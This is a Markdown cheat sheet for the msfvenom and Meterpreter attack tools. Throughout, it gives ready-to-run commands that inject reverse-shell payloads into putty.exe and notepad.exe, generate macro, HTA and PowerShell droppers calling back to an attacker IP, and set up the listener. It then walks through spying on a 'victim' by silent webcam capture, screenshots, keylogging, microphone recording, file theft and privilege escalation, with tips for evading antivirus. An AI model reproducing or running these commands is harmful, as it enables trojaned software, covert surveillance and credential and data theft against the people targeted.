# 🔥 COMPLETE MSFVENOM & METERPRETER CHEAT SHEET 🔥

---

## 📦 PART 1: MSFVENOM PAYLOAD GENERATION

---

### 1️⃣ PUTTY.EXE PAYLOAD INJECT

#### Basic Injection (with -k)
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.180 LPORT=4444 -x putty.exe -k -f exe -o putty_backdoored.exe
```

#### Without -k (if putty crashes)
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.180 LPORT=4444 -x putty.exe -f exe -o putty_backdoored.exe
```

#### x64 Version (64-bit)
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.180 LPORT=4444 -x putty.exe -k -f exe -o putty_backdoored.exe
```

---

### 2️⃣ NORMAL WINDOWS PAYLOAD (No Template)

#### Basic Payload (32-bit)
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.180 LPORT=4444 -f exe -o payload.exe
```

#### 64-bit Payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.180 LPORT=4444 -f exe -o payload.exe
```

#### Other Common Formats

| Format | Command |
|:---|:---|
| **Python** | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.180 LPORT=4444 -f python -o payload.py` |
| **PowerShell** | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.180 LPORT=4444 -f psh -o payload.ps1` |
| **VBA (Macro)** | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.180 LPORT=4444 -f vba -o payload.vba` |
| **HTA** | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.180 LPORT=4444 -f hta-psh -o payload.hta` |
| **DLL** | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.180 LPORT=4444 -f dll -o payload.dll` |

---

### 3️⃣ PUTTY.EXE TROUBLESHOOTING COMMANDS

#### If Putty Crashes (Remove -k)
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.180 LPORT=4444 -x putty.exe -f exe -o putty_backdoored.exe
```

#### If Putty Doesn't Run at All (Try Different Template)
```bash
# Try using a different executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.180 LPORT=4444 -x notepad.exe -k -f exe -o notepad_backdoored.exe
```

#### If File Size is Too Large
```bash
# Use UPX compression after generating
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.180 LPORT=4444 -x putty.exe -k -f exe -o putty_backdoored.exe
upx putty_backdoored.exe
```

#### If Target is 64-bit
```bash
# Use x64 payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.180 LPORT=4444 -x putty.exe -k -f exe -o putty_backdoored.exe
```

#### If No Connection
```bash
# Check if port is open
nc -lvnp 4444
# Or use a different port
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.180 LPORT=5555 -x putty.exe -k -f exe -o putty_backdoored.exe
```

---

### 🔧 COMMON MSFVENOM PARAMETERS REFERENCE

| Parameter | Description | Example |
|:---|:---|:---|
| `-p` | Payload to use | `windows/meterpreter/reverse_tcp` |
| `LHOST` | Your IP address | `192.168.0.180` |
| `LPORT` | Your listening port | `4444` |
| `-x` | Template EXE (inject into) | `putty.exe` |
| `-k` | Keep original functionality | (flag, no value) |
| `-f` | Output format | `exe`, `python`, `psh`, `dll` |
| `-o` | Output filename | `payload.exe` |
| `-e` | Encoder | `x86/shikata_ga_nai` |
| `-i` | Encoding iterations | `5` |

---

## 🎯 PART 2: METERPRETER COMMANDS

---

### 4️⃣ METERPRETER SCREENSHOT COMMANDS

| Command | Description |
|:---|:---|
| `screenshot` | Take screenshot of target's desktop |
| `screenshot -p /path/file.jpg` | Save screenshot to custom path |
| `screenshot -t 100` | High quality (1-100, default 50) |
| `screenshot -q` | Quick mode (lower quality, faster) |
| `screenshot -d 5` | Delay 5 seconds before capture |

#### Examples:
```text
meterpreter > screenshot
[*] Screenshot saved to: /root/.msf4/logs/screenshot_20260627_143022.jpg

meterpreter > screenshot -p /root/Desktop/victim_screen.jpg -t 100
[*] Screenshot saved to: /root/Desktop/victim_screen.jpg
```

---

### 5️⃣ METERPRETER WEBCAM COMMANDS

| Command | Description |
|:---|:---|
| `webcam_list` | List all available webcams |
| `webcam_snap` | Take photo from default webcam |
| `webcam_snap -i 2` | Use webcam #2 (from list) |
| `webcam_snap -v false` | Silent mode (no preview) |
| `webcam_stream` | Start live video stream |
| `webcam_stream -i 2` | Stream from webcam #2 |
| `webcam_stream -f 30` | Set FPS to 30 |

#### Examples:
```text
meterpreter > webcam_list
[*] Webcam 1: Integrated Camera
[*] Webcam 2: USB Camera

meterpreter > webcam_snap -i 2 -v false
[*] Captured photo saved to: /root/.msf4/logs/webcam_snap_20260627_143022.jpg

meterpreter > webcam_stream -i 1
[*] Starting stream on http://192.168.0.180:8080
```

---

### 6️⃣ METERPRETER FILE TRANSFER COMMANDS

| Command | Description |
|:---|:---|
| `download C:\file.txt` | Download file from target to attacker |
| `download C:\folder\*` | Download all files from folder |
| `download C:\folder\ /root/Desktop/` | Download to specific location |
| `upload /root/file.txt C:\` | Upload file to target |
| `upload /root/folder\* C:\Temp\` | Upload multiple files |

#### Examples:
```text
meterpreter > download C:\Users\victim\Desktop\secret.txt
[*] Downloading: secret.txt -> secret.txt

meterpreter > upload /root/Desktop/tool.exe C:\Windows\Temp\
[*] Uploading: tool.exe -> C:\Windows\Temp\tool.exe

meterpreter > download C:\Users\victim\Documents\* /root/Desktop/
[*] Downloading all files from C:\Users\victim\Documents\
```

---

### 7️⃣ METERPRETER PROCESS & SYSTEM COMMANDS

| Command | Description |
|:---|:---|
| `ps` | List all running processes |
| `migrate PID` | Migrate to another process (PID) |
| `getpid` | Get current process ID |
| `getsystem` | Attempt to elevate to SYSTEM |
| `getuid` | Show current user |
| `sysinfo` | Show system information |
| `execute -f cmd.exe` | Execute a command |
| `execute -f cmd.exe -i` | Execute and interact |
| `shell` | Spawn a Windows command shell |
| `exit` | Terminate session |

#### Examples:
```text
meterpreter > ps
[*] Process List
PID   Name
1234  explorer.exe
5678  chrome.exe
9012  svchost.exe

meterpreter > migrate 1234
[*] Migrating to PID 1234...
[*] Migration successful!

meterpreter > getsystem
[*] Attempting to get SYSTEM privileges...
[+] Success!

meterpreter > shell
C:\Windows\System32>
```

---

### 8️⃣ METERPRETER KEYLOGGING

| Command | Description |
|:---|:---|
| `keyscan_start` | Start keylogger |
| `keyscan_dump` | Dump captured keystrokes |
| `keyscan_stop` | Stop keylogger |

#### Examples:
```text
meterpreter > keyscan_start
[*] Starting keystroke scanner...

meterpreter > keyscan_dump
[*] Dumping captured keystrokes...
Username: admin
Password: *********

meterpreter > keyscan_stop
[*] Keystroke scanner stopped.
```

---

### 9️⃣ METERPRETER OTHER USEFUL COMMANDS

| Command | Description |
|:---|:---|
| `help` | Show all available commands |
| `background` | Background current session |
| `sessions` | List all active sessions |
| `sessions -i 1` | Interact with session 1 |
| `load stdapi` | Load standard API (auto-loaded) |
| `load powershell` | Load PowerShell extension |
| `load incognito` | Load Incognito (token stealing) |
| `record_mic -d 10` | Record audio for 10 seconds |
| `enumdesktops` | List available desktops |

---

### 🔟 COMPLETE WORKFLOW EXAMPLE

```bash
# Step 1: Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.180 LPORT=4444 -x putty.exe -k -f exe -o putty_backdoored.exe

# Step 2: Start listener
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.0.180
set LPORT 4444
exploit

# Step 3: After getting session
meterpreter > sysinfo
meterpreter > getuid
meterpreter > screenshot
meterpreter > webcam_list
meterpreter > webcam_snap -v false
meterpreter > download C:\Users\victim\Desktop\secret.txt
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > shell
```

---

### 📝 QUICK REFERENCE CARD

| Action | Command |
|:---|:---|
| **Generate EXE** | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o payload.exe` |
| **Inject into Putty** | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -x putty.exe -k -f exe -o putty_backdoored.exe` |
| **Start Listener** | `msfconsole` → `use exploit/multi/handler` → `set payload windows/meterpreter/reverse_tcp` → `set LHOST IP` → `set LPORT PORT` → `exploit` |
| **Screenshot** | `screenshot` |
| **Webcam Photo** | `webcam_snap -v false` |
| **Webcam Stream** | `webcam_stream` |
| **Download File** | `download C:\file.txt` |
| **Upload File** | `upload /root/file.txt C:\` |
| **Start Keylogger** | `keyscan_start` |
| **Dump Keys** | `keyscan_dump` |
| **Get Shell** | `shell` |
| **Elevate Privileges** | `getsystem` |
| **Migrate Process** | `migrate PID` |
| **List Processes** | `ps` |
| **Background Session** | `background` |
| **List Sessions** | `sessions` |
| **Exit Session** | `exit` |

---

### 🚀 ONE-LINER LISTENER (No msfconsole)

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.0.180; set LPORT 4444; exploit"
```

---

### ⚠️ IMPORTANT NOTES

| Issue | Solution |
|:---|:---|
| **Putty crashes** | Remove `-k` flag |
| **No connection** | Check firewall, IP, port |
| **AV detection** | Use encoding or different template |
| **Session drops** | Migrate to stable process (explorer.exe) |
| **Webcam not found** | Use `webcam_list` first |
| **Permission denied** | Try `getsystem` to elevate |

---

**📌 Save this sheet for quick reference!** 🎯
